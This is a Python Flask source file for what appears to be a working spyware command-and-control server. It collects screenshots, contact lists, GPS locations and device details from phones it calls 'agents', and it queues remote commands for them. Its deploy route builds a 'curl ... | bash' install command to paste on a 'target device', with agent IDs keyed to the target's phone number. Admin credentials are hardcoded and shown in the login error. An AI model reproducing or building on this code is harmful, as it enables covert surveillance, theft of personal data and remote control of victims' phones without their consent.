from flask import Flask, request, jsonify, session, redirect, render_template, Response, send_file, render_template_string
import sqlite3
from datetime import datetime
import os
import random
import io
import json
import time
import base64
from threading import Lock
import logging

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'mp_agent_platform_2024')
app.template_folder = 'templates'

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Admin credentials
ADMIN_USERNAME = "Mpc"
ADMIN_PASSWORD = "0220Mpc"

# Database lock
db_lock = Lock()

def init_database():
    with db_lock:
        conn = sqlite3.connect('mp_agent.db')
        cursor = conn.cursor()
        
        # Drop all old tables to remove fake data
        cursor.execute("DROP TABLE IF EXISTS agents")
        cursor.execute("DROP TABLE IF EXISTS screenshots")
        cursor.execute("DROP TABLE IF EXISTS contacts")
        cursor.execute("DROP TABLE IF EXISTS locations")
        cursor.execute("DROP TABLE IF EXISTS commands")
        cursor.execute("DROP TABLE IF EXISTS system_logs")
        
        # Create fresh tables
        cursor.execute('''
            CREATE TABLE agents (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT UNIQUE NOT NULL,
                phone_model TEXT,
                android_version TEXT,
                ip_address TEXT,
                status TEXT DEFAULT 'active',
                first_seen DATETIME,
                last_seen DATETIME,
                screenshot_count INTEGER DEFAULT 0,
                battery_level INTEGER,
                last_screenshot DATETIME,
                user_agent TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                screenshot_data BLOB,
                timestamp DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE contacts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                contact_name TEXT,
                phone_number TEXT,
                timestamp DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                latitude REAL,
                longitude REAL,
                accuracy REAL,
                address TEXT,
                timestamp DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                command TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                timestamp DATETIME
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE system_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                level TEXT,
                message TEXT,
                timestamp DATETIME
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info("✅ FRESH database created - ALL fake data removed")

def get_db_connection():
    try:
        conn = sqlite3.connect('mp_agent.db', timeout=30)
        conn.row_factory = sqlite3.Row
        return conn
    except sqlite3.OperationalError as e:
        time.sleep(0.1)
        return get_db_connection()

def log_event(level, message):
    with db_lock:
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
            (level, message, datetime.now())
        )
        conn.commit()
        conn.close()

def row_to_dict(row):
    if row is None:
        return None
    return {key: row[key] for key in row.keys()}

def safe_fetchone(cursor):
    row = cursor.fetchone()
    return row_to_dict(row) if row else None

def safe_fetchall(cursor):
    rows = cursor.fetchall()
    return [row_to_dict(row) for row in rows] if rows else []

# Initialize fresh database
init_database()

# ==================== ADMIN ROUTES ====================

@app.route('/')
def index():
    if session.get('authenticated'):
        return redirect('/dashboard')
    return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['authenticated'] = True
            session['username'] = username
            log_event('INFO', f'Admin login: {username}')
            return redirect('/dashboard')
        else:
            return '''
            <script>
                alert("Invalid credentials! Use: Mpc / 0220Mpc");
                window.location.href = "/login";
            </script>
            '''
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>MP_AGENT - Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; display: flex; justify-content: center; align-items: center; }
            .login-container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { color: #333; font-size: 28px; margin-bottom: 10px; }
            .form-group { margin-bottom: 20px; }
            .form-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; }
            .form-group input { width: 100%; padding: 12px 15px; border: 2px solid #e1e1e1; border-radius: 8px; font-size: 14px; }
            .btn-login { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                <h1>🔐 MP_AGENT PLATFORM</h1>
                <p>REAL DATA ONLY - No Fake Data</p>
            </div>
            <form method="POST" action="/login">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" placeholder="Enter username" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter password" required>
                </div>
                <button type="submit" class="btn-login">Login to Control Panel</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/dashboard')
def dashboard():
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        
        stats = {
            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
            'total_contacts': conn.execute("SELECT COUNT(*) FROM contacts").fetchone()[0],
            'total_locations': conn.execute("SELECT COUNT(*) FROM locations").fetchone()[0],
            'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
        }
        
        agents = safe_fetchall(conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC"))
        screenshots = safe_fetchall(conn.execute('''
            SELECT s.*, a.phone_model FROM screenshots s 
            LEFT JOIN agents a ON s.agent_id = a.agent_id 
            WHERE s.screenshot_data IS NOT NULL 
            ORDER BY s.timestamp DESC LIMIT 12
        '''))
        contacts = safe_fetchall(conn.execute("SELECT * FROM contacts ORDER BY timestamp DESC LIMIT 20"))
        locations = safe_fetchall(conn.execute("SELECT * FROM locations ORDER BY timestamp DESC LIMIT 10"))
        
        conn.close()
    
    return render_template('dashboard.html',
                         stats=stats,
                         agents=agents,
                         screenshots=screenshots,
                         contacts=contacts,
                         locations=locations,
                         platform_url=request.host_url.rstrip('/'))

@app.route('/admin')
def admin_dashboard():
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        
        stats = {
            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
            'total_contacts': conn.execute("SELECT COUNT(*) FROM contacts").fetchone()[0],
            'total_locations': conn.execute("SELECT COUNT(*) FROM locations").fetchone()[0],
            'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
        }
        
        agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
        screenshots = safe_fetchall(conn.execute('''
            SELECT s.*, a.phone_model FROM screenshots s 
            LEFT JOIN agents a ON s.agent_id = a.agent_id 
            WHERE s.screenshot_data IS NOT NULL 
            ORDER BY s.timestamp DESC LIMIT 16
        '''))
        contacts = safe_fetchall(conn.execute("SELECT * FROM contacts ORDER BY timestamp DESC LIMIT 25"))
        locations = safe_fetchall(conn.execute("SELECT * FROM locations ORDER BY timestamp DESC LIMIT 15"))
        commands = safe_fetchall(conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10"))
        logs = safe_fetchall(conn.execute("SELECT * FROM system_logs ORDER BY timestamp DESC LIMIT 20"))
        
        conn.close()
    
    return render_template('admin_dashboard.html',
                         stats=stats,
                         agents=agents,
                         screenshots=screenshots,
                         contacts=contacts,
                         locations=locations,
                         commands=commands,
                         logs=logs,
                         platform_url=request.host_url.rstrip('/'))

# ==================== AGENT API ROUTES ====================

@app.route('/api/agent/register', methods=['POST'])
def register_agent():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No JSON data received'}), 400
            
        agent_id = data.get('agent_id')
        phone_model = data.get('phone_model', 'Unknown Device')
        android_version = data.get('android_version', 'Unknown')
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        logger.info(f"🔍 NEW AGENT REGISTRATION: {agent_id} from {ip_address}")
        
        if not agent_id:
            return jsonify({'status': 'error', 'message': 'Agent ID is required'}), 400
        
        with db_lock:
            conn = get_db_connection()
            
            existing_agent = safe_fetchone(conn.execute(
                "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
            ))
            
            current_time = datetime.now()
            
            if existing_agent:
                conn.execute('''
                    UPDATE agents SET 
                    phone_model = ?, android_version = ?, ip_address = ?, user_agent = ?,
                    status = 'active', last_seen = ?
                    WHERE agent_id = ?
                ''', (phone_model, android_version, ip_address, user_agent, current_time, agent_id))
                action = "updated"
            else:
                conn.execute('''
                    INSERT INTO agents 
                    (agent_id, phone_model, android_version, ip_address, user_agent, status, first_seen, last_seen)
                    VALUES (?, ?, ?, ?, ?, 'active', ?, ?)
                ''', (agent_id, phone_model, android_version, ip_address, user_agent, current_time, current_time))
                action = "registered"
            
            conn.commit()
            pending_commands = safe_fetchall(conn.execute(
                "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
                (agent_id,)
            ))
            conn.close()
        
        log_event('INFO', f'NEW AGENT {action}: {agent_id} from {ip_address}')
        
        commands_list = [cmd['command'] for cmd in pending_commands]
        
        return jsonify({
            'status': 'success', 
            'message': f'Agent {action} successfully',
            'pending_commands': commands_list
        })
        
    except Exception as e:
        logger.error(f"❌ Agent registration failed: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/submit_report', methods=['POST'])
def submit_report():
    """Receive ONLY REAL data reports from agents - NO FAKE DATA"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No JSON data received'}), 400
            
        agent_id = data.get('agent_id')
        report_type = data.get('report_type')
        report_data = data.get('report_data', {})
        
        logger.info(f"📨 REAL DATA RECEIVED: {report_type} from {agent_id}")
        
        if not agent_id:
            return jsonify({'status': 'error', 'message': 'Agent ID is required'}), 400
        
        with db_lock:
            conn = get_db_connection()
            current_time = datetime.now()
            
            # Handle ONLY REAL data - NO FAKE DATA
            if report_type == 'screenshot':
                # Store ONLY real screenshot data
                if 'image_data' in report_data and report_data['image_data']:
                    try:
                        image_data = report_data['image_data']
                        if image_data.startswith('data:image'):
                            image_data = image_data.split(',')[1]
                        
                        screenshot_binary = base64.b64decode(image_data)
                        conn.execute(
                            'INSERT INTO screenshots (agent_id, screenshot_data, timestamp) VALUES (?, ?, ?)',
                            (agent_id, screenshot_binary, current_time)
                        )
                        logger.info(f"✅ REAL screenshot stored from {agent_id}")
                    except Exception as e:
                        logger.error(f"❌ Failed to store screenshot: {e}")
                
                conn.execute(
                    'UPDATE agents SET last_seen = ?, last_screenshot = ?, screenshot_count = screenshot_count + 1, status = "active" WHERE agent_id = ?',
                    (current_time, current_time, agent_id)
                )
                
            elif report_type == 'location':
                # Store ONLY real location data
                latitude = report_data.get('latitude')
                longitude = report_data.get('longitude')
                accuracy = report_data.get('accuracy')
                address = report_data.get('address', '')
                
                # Only store if we have valid coordinates
                if latitude and longitude and latitude != 0.0 and longitude != 0.0:
                    conn.execute(
                        'INSERT INTO locations (agent_id, latitude, longitude, accuracy, address, timestamp) VALUES (?, ?, ?, ?, ?, ?)',
                        (agent_id, latitude, longitude, accuracy, address, current_time)
                    )
                    logger.info(f"📍 REAL location stored from {agent_id}: {latitude}, {longitude}")
                else:
                    logger.warning(f"⚠ Invalid location data from {agent_id}")
                
                conn.execute(
                    'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
                    (current_time, agent_id)
                )
                
            elif report_type == 'contacts':
                # Store ONLY real contacts
                contacts_list = report_data.get('contacts', [])
                real_contacts_count = 0
                
                for contact in contacts_list:
                    name = contact.get('name', '').strip()
                    phone = contact.get('phone', '').strip()
                    
                    # Only store if we have valid contact data (not fake)
                    if name and phone and name != 'Unknown' and phone != 'Unknown':
                        conn.execute(
                            'INSERT INTO contacts (agent_id, contact_name, phone_number, timestamp) VALUES (?, ?, ?, ?)',
                            (agent_id, name, phone, current_time)
                        )
                        real_contacts_count += 1
                
                logger.info(f"👥 Stored {real_contacts_count} REAL contacts from {agent_id}")
                conn.execute(
                    'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
                    (current_time, agent_id)
                )
                
            elif report_type == 'device_info':
                # Update device information
                battery = report_data.get('battery', 0)
                conn.execute(
                    'UPDATE agents SET last_seen = ?, battery_level = ?, status = "active" WHERE agent_id = ?',
                    (current_time, battery, agent_id)
                )
                logger.info(f"📱 REAL device info updated for {agent_id}")
                
            elif report_type == 'heartbeat':
                # Simple heartbeat
                conn.execute(
                    'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
                    (current_time, agent_id)
                )
                logger.info(f"💓 Heartbeat from {agent_id}")
            
            conn.commit()
            conn.close()
        
        log_event('INFO', f'REAL {report_type} data received from {agent_id}')
        return jsonify({'status': 'success', 'message': 'Real data received successfully'})
        
    except Exception as e:
        logger.error(f"❌ Report submission failed: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/check_commands/<agent_id>')
def check_commands(agent_id):
    with db_lock:
        conn = get_db_connection()
        commands = safe_fetchall(conn.execute(
            "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
            (agent_id,)
        ))
        conn.close()
    
    commands_list = [{'id': cmd['id'], 'command': cmd['command']} for cmd in commands]
    return jsonify({'commands': commands_list})

@app.route('/api/agent/command_result', methods=['POST'])
def command_result():
    try:
        data = request.get_json()
        command_id = data.get('command_id')
        result = data.get('result')
        
        with db_lock:
            conn = get_db_connection()
            conn.execute(
                "UPDATE commands SET status = 'completed', result = ? WHERE id = ?",
                (result, command_id)
            )
            conn.commit()
            conn.close()
        
        logger.info(f"✅ Command {command_id} completed: {result}")
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logger.error(f"❌ Command result failed: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/media/screenshot/<int:screenshot_id>')
def serve_screenshot(screenshot_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        screenshot = safe_fetchone(conn.execute(
            "SELECT screenshot_data FROM screenshots WHERE id = ?", (screenshot_id,)
        ))
        conn.close()
    
    if screenshot and screenshot['screenshot_data']:
        return Response(screenshot['screenshot_data'], mimetype='image/jpeg')
    
    # Return placeholder for real system
    from PIL import Image, ImageDraw
    img = Image.new('RGB', (400, 300), color='#1a1a1a')
    d = ImageDraw.Draw(img)
    d.text((100, 150), "REAL SCREENSHOT DATA", fill='white')
    img_io = io.BytesIO()
    img.save(img_io, 'JPEG')
    img_io.seek(0)
    return Response(img_io.getvalue(), mimetype='image/jpeg')

# ==================== COMMAND ROUTES ====================

@app.route('/admin/command', methods=['POST'])
def send_command():
    if not session.get('authenticated'):
        return redirect('/login')
    
    agent_id = request.form.get('agent_id')
    command = request.form.get('command')
    
    if not agent_id or not command:
        return "Missing agent_id or command", 400
    
    with db_lock:
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO commands (agent_id, command, timestamp) VALUES (?, ?, ?)',
            (agent_id, command, datetime.now())
        )
        conn.commit()
        conn.close()
    
    log_event('INFO', f'REAL command sent to {agent_id}: {command}')
    return redirect('/admin')

# ==================== DEPLOYMENT ROUTE (FIXED) ====================

@app.route('/deploy', methods=['POST'])
def deploy_agent():
    if not session.get('authenticated'):
        return redirect('/login')
    
    target_phone = request.form.get('phone_number')
    agent_id = request.form.get('agent_id', f'actual_{target_phone}')
    
    platform_url = request.host_url.rstrip('/')
    agent_command = f"curl -s {platform_url}/download_agent?phone={agent_id} | bash"
    
    # Check if agent already exists before inserting
    with db_lock:
        conn = get_db_connection()
        existing_agent = safe_fetchone(conn.execute(
            "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
        ))
        
        if not existing_agent:
            conn.execute(
                'INSERT INTO agents (agent_id, status, first_seen, last_seen) VALUES (?, ?, ?, ?)',
                (agent_id, 'deployed', datetime.now(), datetime.now())
            )
            conn.commit()
            log_event('INFO', f'New agent deployment: {agent_id}')
        else:
            log_event('INFO', f'Agent already exists: {agent_id}')
        
        conn.close()
    
    return f'''
    <html>
    <head><title>Deploy Actual Data Agent</title></head>
    <body style="font-family: Arial; padding: 20px; background: #1a1a1a; color: white;">
        <h1>🎯 Deploy ACTUAL DATA Agent</h1>
        <div style="background: #2d2d2d; padding: 20px; border-radius: 10px;">
            <h3>📱 Agent ID: {agent_id}</h3>
            <p>This agent collects <strong>ONLY ACTUAL DEVICE DATA</strong>:</p>
            <ul>
                <li>📱 Actual Device Model</li>
                <li>🤖 Actual Android Version</li>
                <li>🔋 Actual Battery Status</li>
                <li>📍 Actual Location (if available)</li>
                <li>📖 Actual Contacts (if accessible)</li>
            </ul>
            
            <p style="color: #f44336; font-weight: bold;">🚫 NO FAKE DATA WILL BE SENT</p>
            
            <h3>🚀 Installation Command:</h3>
            <div style="background: #000; padding: 15px; border-radius: 5px; font-family: monospace;">
                {agent_command}
            </div>
            
            <p style="margin-top: 20px;">
                <strong>Copy and paste this command in Termux on the target device.</strong>
            </p>
            
            <a href="/admin" style="background: #667eea; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">
                📊 Go to Admin Dashboard
            </a>
        </div>
    </body>
    </html>
    '''

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)